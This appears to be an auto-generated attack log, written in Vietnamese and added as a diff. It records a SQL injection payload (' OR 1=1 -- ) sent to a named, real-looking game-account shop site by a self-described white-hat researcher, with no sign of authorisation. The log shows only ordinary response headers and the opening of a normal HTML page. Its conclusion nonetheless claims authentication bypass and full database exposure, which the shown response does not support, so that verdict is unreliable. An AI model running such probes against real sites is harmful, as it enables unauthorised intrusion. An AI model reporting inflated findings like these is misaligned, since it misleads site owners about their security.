@@ -1,0 +1,26 @@
+HỒ SƠ BẰNG CHỨNG TẤN CÔNG THỰC TẾ (FORENSIC LOG)
+Mục tiêu: https://shophaosua.com/tai-khoan/chi-tiet?w=2017293.aBk1oGUD
+Ngày thực hiện: 2025-12-03 00:11:57.536516
+Người thực hiện: White Hat Security Researcher
+CAM KẾT: Tool này chỉ gửi mã khai thác để chứng minh (Proof of Concept).
+Không có dữ liệu nào bị xóa hay thay đổi trong quá trình này.
+================================================================================
+
+================================================================================
+THỜI GIAN: 2025-12-03 00:11:59
+LOẠI TẤN CÔNG: SQL INJECTION
+MỤC TIÊU (URL): https://shophaosua.com/tai-khoan/chi-tiet?w=%27+OR+1%3D1+--+
+--------------------------------------------------------------------------------
+[HACKER GỬI - PAYLOAD]: ' OR 1=1 -- 
+--------------------------------------------------------------------------------
+[SERVER TRẢ LỜI - HEADERS]:
+{'Date': 'Tue, 02 Dec 2025 17:11:57 GMT', 'Content-Type': 'text/html;charset=utf-8', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Server': 'cloudflare', 'Nel': '{"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}', 'Vary': 'Accept-Encoding', 'x-powered-by': 'Nuxt', 'cf-cache-status': 'DYNAMIC', 'Report-To': '{"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=m4Xkk9sw0ZVj7WQ4opjXpVUnMTNubJ0K7P%2BRSMyT5xgxYlcm9tS7h9TMHlZoYa%2FKzXVELQ3JaBoUd1u3xzD8RoiBRm6AI74WcVlkwFCt3kdif1fUoevlRQ%3D%3D"}]}', 'Content-Encoding': 'gzip', 'Set-Cookie': 'auth.strategy=auth0; Path=/', 'CF-RAY': '9a7c72431dd0f87a-SIN', 'alt-svc': 'h3=":443"; ma=86400'}
+--------------------------------------------------------------------------------
+[SERVER TRẢ LỜI - BODY (Trích dẫn bằng chứng)]:
+<!DOCTYPE html><html  style="overflow-x:hidden"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Shop Game Liên Quân Uy Tín, Giá Rẻ Của Hào Sữa Gaming</title>
+<style>/*! tailwindcss v3.3.7 | MIT License | https://tailwindcss.com*/*,:after,:before{border:0 solid #e5e7eb;box-sizing:border-box}:after,:before{--tw-content:""}html{line-height:1.5;-webkit-text-size-adjust:100%;font-family:ui-sans-serif,syste ...
+--------------------------------------------------------------------------------
+KẾT LUẬN THIỆT HẠI: THIỆT HẠI: Hacker có thể đọc/xóa toàn bộ Database. Server đã trả về TOÀN BỘ dữ liệu (Bypass Authentication) do điều kiện 1=1 luôn đúng.
+================================================================================
